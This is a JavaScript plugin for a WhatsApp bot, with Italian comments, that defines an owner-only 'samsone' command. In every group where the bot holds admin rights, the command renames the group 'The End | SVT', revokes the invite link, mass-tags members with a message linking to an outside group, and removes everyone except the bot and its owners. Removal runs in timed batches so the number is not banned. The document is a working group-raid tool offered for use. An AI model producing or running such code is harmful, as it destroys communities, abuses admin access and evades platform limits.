

let handler = async (m, { conn, isOwner }) => {
    // 🔐 SICUREZZA ESTREMA: Solo l'Owner assoluto può avviare questo script.
    if (!isOwner) return;

    await m.reply("『 ☢️ 』 *INIZIALIZZAZIONE PROTOCOLLO: THE END*\n_Scansione dei domini e calcolo dei bersagli in corso. Questo processo potrebbe richiedere alcuni minuti..._");

    const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';
    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');

    let groups;
    try {
        // Recupera tutti i gruppi in cui è presente il bot
        groups = await conn.groupFetchAllParticipating();
    } catch (e) {
        return m.reply("『 ❌ 』 Errore nel recupero della lista gruppi.");
    }

    let wipedGroups = 0;

    // Inizia il ciclo su TUTTI i gruppi
    for (let jid in groups) {
        try {
            let group = groups[jid];
            let participants = group.participants;

            // Controlla se il bot è admin in questo specifico gruppo
            let botObj = participants.find(p => (p.id || p.jid) === botId);
            let isBotAdmin = botObj && (botObj.admin === 'admin' || botObj.admin === 'superadmin');

            // Se non è admin, passa al gruppo successivo (non può cacciare nessuno)
            if (!isBotAdmin) continue;

            // 🔹 1. CAMBIO NOME GRUPPO (Taglio estetico)
            let newName = `𝐓𝐡𝐞 𝐄𝐧𝐝 | 𝐒𝐕𝐓`.substring(0, 25);
            await conn.groupUpdateSubject(jid, newName).catch(() => {});
            await delay(1000); // Pausa per i limiti di WhatsApp

            // 🔹 2. RESET LINK GRUPPO
            await conn.groupRevokeInvite(jid).catch(() => {});
            await delay(1000);

            // Filtra chi cacciare (Esclude il bot e gli Owner)
            let allJids = participants.map(p => p.id || p.jid);
            let usersToRemove = allJids.filter(id => id !== botId && !ownerJids.includes(id));

            if (usersToRemove.length > 0) {
                // 🔹 3. MESSAGGIO MINIMALISTA CON FONT
                let endMsg = `
✦ ⁺ . ⁺ ✦ ⁺ . ⁺ ✦ ⁺ . ⁺ ✦
·  𝕿 𝖍 𝖊  𝕰 𝖓 𝖉  ·
✦ ⁺ . ⁺ ✦ ⁺ . ⁺ ✦ ⁺ . ⁺ ✦

『 🥀 』 _Tutto giunge al termine._

➤ https://chat.whatsapp.com/FeR5d1okEdQDa1qhwgp3JP?mode=gi_t
`.trim();

                // Invia il messaggio taggando tutti i presenti
                await conn.sendMessage(jid, { text: endMsg, mentions: allJids });
                await delay(2000);

                // 🔹 4. RIMOZIONE CHIRURGICA A BLOCCHI
                // Li cacciamo a blocchi di 5 per non far crashare il server o far bannare il numero
                const chunkSize = 5;
                for (let i = 0; i < usersToRemove.length; i += chunkSize) {
                    const chunk = usersToRemove.slice(i, i + chunkSize);
                    await conn.groupParticipantsUpdate(jid, chunk, 'remove').catch(() => {});
                    await delay(2000); // 2 secondi tra un blocco e l'altro
                }
                
                wipedGroups++;
            }

        } catch (e) {
            console.error(`Errore esecuzione The End sul gruppo ${jid}:`, e);
        }
    }

    // Report finale mandato nella chat dove hai eseguito il comando
    m.reply(`『 ☢️ 』 *PROTOCOLLO COMPLETATO*\nIl sipario è calato su *${wipedGroups}* gruppi.`);
};

handler.help = ['samson'];
handler.tags = ['owner'];
handler.command = /^(samsone)$/i;
handler.owner = true;

export default handler;